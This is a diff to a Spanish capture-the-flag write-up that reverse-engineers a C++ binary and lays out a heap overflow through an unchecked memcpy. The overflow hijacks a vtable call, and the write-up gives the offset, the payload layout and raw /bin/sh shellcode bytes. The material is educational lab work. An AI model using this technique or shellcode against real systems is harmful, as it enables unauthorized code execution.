@@ -28,7 +28,7 @@
       0x0804870c <+22>:	ret
     End of assembler dump.
    
-    La función _ZN1NC2Ei es:
+    La función _ZN1NC2Ei (0x8048848) es:
       - _ZN significa que es un símbolo manglado.
       - 1N corresponde al nombre de la clase N.
       - C2 indica que es el constructor.
@@ -41,13 +41,13 @@
       | 0x00           | Puntero a la vtable     | <-- `0x8048848`
       | 0x04           | (posible padding)       |
       | ...            | Otros miembros (si hay) |
-      | 0x68           | Miembro entero (value)  |
-      -----------------+--------------------------
+      | 0x68           | Miembro int (value)     |
+      --------------------------------------------
     
   Es el constructor. Carga el valor del parametro en la posición 0x68 de la instancia de la clase
   [...]
-    0x08048705 <+15>:	mov    edx,DWORD PTR [ebp+0xc] ;segundo parámetro (int)
-    0x08048708 <+18>:	mov    DWORD PTR [eax+0x68],edx ;almacena en el offset 0x68
+    0x08048705 <+15>:	mov    edx,DWORD PTR [ebp+0xc]    ;segundo parámetro (int)
+    0x08048708 <+18>:	mov    DWORD PTR [eax+0x68],edx   ;almacena en el offset 0x68
   [...]
 
   Esto nos da pistas de que hay lo que parece un int en la posición 0x68 de la clase N
@@ -95,7 +95,7 @@ que son en total 0x64(100)bytes. Entonces la clase N tiene los siguientes miembr
   char str[100];
 
 9.- Como vemos que no se protege de ninguna manera la cantidad de bytes del segundo parámetro de memcpy podemos usar
-esta función tenemos un posible vector de ataque para nuestro overflow
+esta función teniendo un posible vector de ataque para nuestro overflow
 
 10.- Cuando Desensamblamos N::operator+(N&) y N::operator-(N&) no vemos nada especial solo que se pasa como
 argumento la referencia de la clase
@@ -145,7 +145,7 @@ y como argumento le pasa argv[1]
     0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>  ;llamada a setAnnotation(argb[1])
   [...]
 
-15.- El main continua con el main para preparar un call de la sobrecarga del operador+ de obj_2
+15.- El main continua para preparar un call de la sobrecarga del operador+ de obj_2
   [...]
     0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10] ;this de obj_2
     0x08048680 <+140>:	mov    eax,DWORD PTR [eax]      ;desreferencia de this->obj_2
@@ -159,8 +159,8 @@ y como argumento le pasa argv[1]
 
 16.- Vamos con la explotación
 
-17.- El plan es insertar una cadena como argv[1] para que probocar un overflow en el memcyp() y ejecutar una shell como
-usuario bonus0 y obtener la flag haciendo uso del call que hay en main<+159> (setAnnotation())
+17.- El plan es insertar una cadena como argv[1] para que probocar un overflow en el memcyp() de setAnnotation y ejecutar una shell como
+usuario bonus0 y obtener la flag haciendo uso del call que hay en main<+159> (N::operator+(N&))
 
 18.- Lo primero es ver el offset que proboca el overflow. Usaremos la herramienta online https://wiremask.eu/tools/buffer-overflow-pattern-generator/
 Le pasamos el patron como argv[1] desde gdb
@@ -194,7 +194,7 @@ Con la herramienta online no da un offset de 108
     
 20.- Ahora tenemos un problema y es la doble desreferencia que hace para obtener la dirección de la sobrecarga del operator+()
   [...]
-    0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10] 
+    0x0804867c <+136-:	mov    eax,DWORD PTR [esp+0x10] 
     0x08048680 <+140>:	mov    eax,DWORD PTR [eax]      
     0x08048682 <+142>:	mov    edx,DWORD PTR [eax]      
   [...]
@@ -207,12 +207,12 @@ Con la herramienta online no da un offset de 108
     [shelcode] + [offset] + [addr shelcode] 
       ^                          |
       |                          |
-      +--------------------------+ ; Primera desreferencia           ->  0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
+      ---------------------------- ; Primera desreferencia           ->  0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
 
     [shelcode] + [offset] + [addr shelcode] 
       |
       |
-      +--[...]---> [invalid addres] ; Segunda desreferencia = crash  ->  0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
+      ---[...]---> [invalid addres] ; Segunda desreferencia = crash  ->  0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
   
   Para solucionar esto podemos insertar antes del shellcode otra vez la dirección donde está el shellcode + 0x4 de esta manera
 
@@ -223,12 +223,12 @@ Con la herramienta online no da un offset de 108
     [addr shelcode + 0x4] + [shelcode] + [offset] + [addr shelcode] 
       ^                                                 |
       |                                                 |
-      +-------------------------------------------------+; Primera desreferencia  ->  0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
+      ---------------------------------------------------; Primera desreferencia  ->  0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
 
     [addr shelcode + 0x4] + [shelcode] + [offset] + [addr shelcode] ->  0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
       |                          ^ 
       |                          |
-      +--------------------------+
+      ----------------------------
 
 21.- Lo último que necesitamos es el shellcode que podemos obtenerlo de aquí: https://shell-storm.org/shellcode/files/shellcode-841.html
   \x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
